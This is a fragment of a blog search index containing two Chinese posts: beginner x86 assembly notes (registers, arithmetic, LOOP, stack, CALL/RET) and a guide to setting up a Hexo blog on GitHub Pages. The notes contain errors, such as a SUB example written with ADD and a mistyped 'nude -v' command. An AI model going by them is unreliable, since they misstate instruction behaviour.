id="寄存器">寄存器</span></h2><table><thead><tr><th>操作数</th><th>可用寄存器名称</th></tr></thead><tbody><tr><td>32位</td><td>EAX、EBX、ECX、EDX、EDI、ESI、EBP、ESP、R8D~R15D</td></tr><tr><td>64位</td><td>RAX、RBX、RCX、RDX、RDI、RSI、RBP、RSP、R8~R15</td></tr></tbody></table><p>注意：64位模式下，操作数还是默认位32位，有8个通用寄存器；当给指令加上REX（寄存器扩展）前缀后，操作数才变为64位，添加8个带标号的通用寄存器（R8~R15）</p><p>64位处理器特点：</p><ol><li>64位与32位有相同的标志位状态；</li><li>64位模式下不能访问通用寄存器的高位字节（如AH、BH、CH、DH）;</li></ol><h2><span id="数据类型">数据类型</span></h2><ul><li><p>整数：1234这种要有后缀表明是什么进制的数；</p><p>​            ABCD这种十六进制要在以字母开头的十六进制数前加0表示，如0ABCDh；</p></li><li><p>浮点数：以十进制表示；以十六进制编码</p></li><li><p>字符串常量：允许字符串常量的嵌套（如 ‘he says “hello”‘）;在内存中以整数字节序列保存</p></li></ul><h2><span id="数据传送与访问">数据传送与访问</span></h2><p><strong>MOV指令</strong>：MOV  EAX,ECX  表示将ECX寄存器的值拷贝进EAX (第一个参数为目的操作数，第二个参数为源操作数)</p><p>​    如果出现小操作数（32）扩展为大操作数（64）的情况，需要对操作数进行全零扩展或符号扩展</p><p><strong>XCHG指令</strong>：交换两个操作数的值（操作数数据类型要相同）</p><p>变量名+偏移量可表示一个直接偏移量操作数（管他有没有看懂概念看例子就完事儿）</p><p>如下表示一个数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testArray BYTE 99h,98h,97h,96h</span><br><span class="line">.code</span><br><span class="line">MOV al, testArray             ; al&#x3D;99h</span><br><span class="line">MOV bl, [testArray+1]         ; bl&#x3D;98h</span><br><span class="line">MOV cl, [testArray+2]         ; cl&#x3D;97h</span><br></pre></td></tr></table></figure><h2><span id="算术运算与逻辑运算">算术运算与逻辑运算</span></h2><p><strong>补码</strong>：计算机底层数据都是以补码形式表示；</p><p>​            两机器数相加的补码=先求补码再相加；</p><p>​            加法运算可将符号位和数值为一起算（符号位有进位则直接舍弃）；</p><p>​            减法运算利用其相反数的加法实现；</p><p><strong>INC指令</strong>：操作数+1</p><p><strong>DEC指令</strong>：操作数-1</p><p><strong>ADD指令</strong>：将长度相同的操作数进行相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 10000h</span><br><span class="line">testData2 DWORD 20000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;10000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;30000h</span><br></pre></td></tr></table></figure><p><strong>SUB指令</strong>：从目的操作数中减去源操作数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 20000h</span><br><span class="line">testData2 DWORD 10000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;20000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;10000h</span><br></pre></td></tr></table></figure><p><strong>NEG指令</strong>：将操作数转换为二进制补码，并将符号位取反</p><h2><span id="跳转指令与循环指令">跳转指令与循环指令</span></h2><p>跳转指令类型：条件跳转和无条件跳转</p><p><strong>JMP指令</strong>：无条件跳转；需要用标号来标识，汇编时会将标号转换位相应的偏移量；标号和 JMP指令要再同一函                  数中，但全局标号不受限制。（和goto语句有点像）</p><p>​                下面程序先给EAX赋值再给EBX赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JMP labell</span><br><span class="line">MOV EBX, 0</span><br><span class="line">labell:</span><br><span class="line">MOV EAX, 0</span><br></pre></td></tr></table></figure><p>​                当在循环结束时用JMP指令跳回循环开始位置可实现无限循环</p><p><strong>LOOP指令</strong>：创建一个循环代码块</p><p>​                     ECX寄存器为循环的计数器，循环一次，ECX值-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, 0</span><br><span class="line">MOV ECX, 3</span><br><span class="line">L1:</span><br><span class="line">INC AX</span><br><span class="line">LOOP L1</span><br><span class="line">XOR EAX, EBX</span><br></pre></td></tr></table></figure><p>​    LOOP指令分为两步：第一步将ECX -1；第二步将ECX与0比较，如果ECX不为0，跳转到标号地址处（INC                 AX）；如果ECX为0，则不跳转，执行LOOP下一条指令（XOR   EAX，EBX）</p><p>​    如果ECX的初始值为0，那么执行LOOP指令时，ECX -1变为FFFFFFFFh，是个很大的循环，因此在编写x86汇编语言时一般情况不需要显式地改变ECX的值，特别是存在循环嵌套的情况时。（不懂。。）</p><h2><span id="栈与函数调用">栈与函数调用</span></h2><p><strong>栈</strong>：特点：先入后出（可以想象成一个薯片桶）</p><pre><code>   用途：存储局部变量；执行CALL指令调用函数时，保存函数地址以便函数结束时正确返回；传递函数参数</code></pre><p>​       常用指令：</p><p>​            PUSH指令：入栈；对ESP/RSP/SP寄存器的值减去 4（32位）或 8（64位），将操作数写入寄存器中指针                                指向的内存中</p><p>​            POP指令  ：出栈；是PUSH指令的逆操作；先从ESP等寄存器指向的内存中读取数据写入其他内存地址或                                寄存器，再将寄存器的值加上 4（32位）或 8（64位）</p><p>​        <strong>（说白了：PUSH  AX 表示将寄存器AX中的数据送入栈中；POP AX 表示从栈顶取出数据送入AX）</strong></p><p>下方代码通过栈实现EAX与EBX值的交换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 1234h</span><br><span class="line">   MOV EBX, 5678h</span><br><span class="line">   PUSH EAX</span><br><span class="line">   PUSH EBX</span><br><span class="line">   POP EAX</span><br><span class="line">   POP EBX</span><br></pre></td></tr></table></figure><h3><span id="使用栈保存函数保存地址">使用栈保存函数保存地址</span></h3><p><strong>CALL指令</strong>：调用子函数；调用时，CALL指令的下一条指令地址将作为返回地址被保存在栈中，当调用函数结束                时，执行RET指令跳转到返回地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....code</span><br><span class="line">...main PROC</span><br><span class="line">0x00008000  MOV EBX, EAX</span><br><span class="line">......</span><br><span class="line">0X00008020  CALL testFunc</span><br><span class="line">0x00008025  MOV EAX, EBX</span><br><span class="line">......</span><br><span class="line">...main ENDP</span><br><span class="line">......</span><br><span class="line">0x00008A00  testFunc PROC</span><br><span class="line">...MOV EAX, EDX</span><br><span class="line">......</span><br><span class="line">...RET</span><br><span class="line">...textFunc ENDP</span><br></pre></td></tr></table></figure><p>注：proc是定义子程序的伪指令，位置在子程序的开始处，它和endp分别表示子程序定义的开始和结束两者必须成对出现。</p><p>当CALL指令执行时，下一条指令地址（0x00008025）被压入栈中，被调用函数testFunc地址0x00008A00被加载进EIP寄存器（EIP寄存器存放  下一个CPU指令存放的内存地址）</p><p>   执行RET指令时，ESP指向的数据弹出至EIP；ESP数值增加指向栈中上一个值</p><h3><span id="使用栈传递函数参数">使用栈传递函数参数</span></h3><p>cdecl约定：</p><p>​            假设函数 func 有三个参数 agr1、agr2、agr3 ，在cdecl约定下通常为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">call func</span><br></pre></td></tr></table></figure><p>（只知道这么多了。。。）</p><h3><span id="使用栈存储变量">使用栈存储变量</span></h3><p>涉及到了PUSHFD和POPFD，但讲的很少就没怎么看懂</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何用hexo创建自己的博客</title>
      <link href="/2021/01/20/my-first-blog/"/>
      <url>/2021/01/20/my-first-blog/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="准备工作">准备工作</span></h1><p> <strong>step1</strong>: 百度搜索 nodejs 下载LTS版本</p><p> <strong>step2</strong>: 下载git </p><p> <strong>step3</strong>: 下载typora</p><p> tips: 安装过程中不停的点next就完事儿</p><hr><h1><span id="正式搭建">正式搭建</span></h1><h2><span id="本地搭建">本地搭建</span></h2><p> <strong>step1</strong>: win+R后输入cmd进入窗口</p><p> <strong>step2</strong>: 查看nude的版本以判断是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nude -v</span><br></pre></td></tr></table></figure><p>查看npm的版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure><p> <strong>step3</strong>: 将镜像源npm换成cnpm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p> <strong>step4</strong>：安装hexo框架</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p> <strong>step5</strong>：在盘中创建新文件夹 (下方指令是在D盘中创建了一个名为blog的文件夹)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir D:\blog</span><br></pre></td></tr></table></figure><p> <strong>step6</strong>：进入blog文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd D:\blog</span><br></pre></td></tr></table></figure><p> <strong>step7</strong>：用hexo生成blog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p> <strong>step8</strong>：启动blog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>此时本地博客已经搭建成功</p><p>打开浏览器输入 localhost:4000 可进入查看</p><p><img src="/images/1.png" alt="1"></p><p> <strong>step9</strong>：ctrl+c断开链接</p><p> <strong>step10</strong>：创建博客文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;文件名&quot;</span><br></pre></td></tr></table></figure><p><strong>step11</strong>：根据提示找到自己的文件并打开</p><p><img src="/images/2.png" alt="2"></p><p><img src="/images/3.png" alt="3"></p><p><img src="/images/4.png" alt="4"></p><p><strong>step12</strong>：在文件中写入想写的东西</p><p><img src="/images/5.png" alt="5"></p><p>写完后保存退出就vans</p><p>注：在tags：后输入一定要有一个空格！正文也是空一格再写！！！</p><p><strong>step13</strong>：清除缓存文件 db.json 和已生成的静态文件 public </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p> <strong>step14</strong>：生成网站静态文件到默认设置的 public 文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p> <strong>step15</strong>：再次启动blog</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>再次打开浏览器输入 localhost:4000 可进入查看</p><p><img src="/images/6.png" alt="6"></p><h2><span id="打通远端">打通远端</span></h2><p> <strong>step1</strong>：进入GitHub并注册自己的账号</p><p> <strong>step2</strong>：新建仓库</p><p><img src="/images/7.png" alt="7"></p><p>注意：repository name这自己owner是啥就取啥名再加上 .github.io</p><p>(我这已经创建过了所以不能再重复创建)</p><p><img src="/images/9.png" alt="9"></p><p>最后点下方的create repository</p><p> <strong>step3</strong>：安装git的部署插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p> <strong>step4</strong>：修改_config.yml文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad _config.yml</span><br></pre></td></tr></table></figure><p>找到# Deployment配置并修改</p><p>注：type后的引号要删去 且冒号后都有一个空格</p><p><img src="/images/10.png" alt="10"></p><p>repo网址可在新建的仓库中找到，如下</p><p><img src="/images/11.png" alt="11"></p><p>最后保存退出</p><p>step4：部署远端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>再次刷新网页即可</p><p><img src="/images/12.png" alt="12"></p><hr><h1><span id="存在的问题">存在的问题</span></h1><ul><li><p>部署远端过程会跳出一个窗口让你输入密码（我再注册发现那玩意儿消失了，可能只会出现一次），那个密码不是你GitHub的账号密码而是personal access tokens中的密码（具体请百度，因为我也不知道我是咋成功的。。。如果有大佬知道还请教教 可怜.jpg）</p></li><li><p>repository name的创建中， .github.io不知道可不可以换成别的，反正换成 .github.io.1后网站就打不开了。。。（我太菜了）</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> windows系统 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
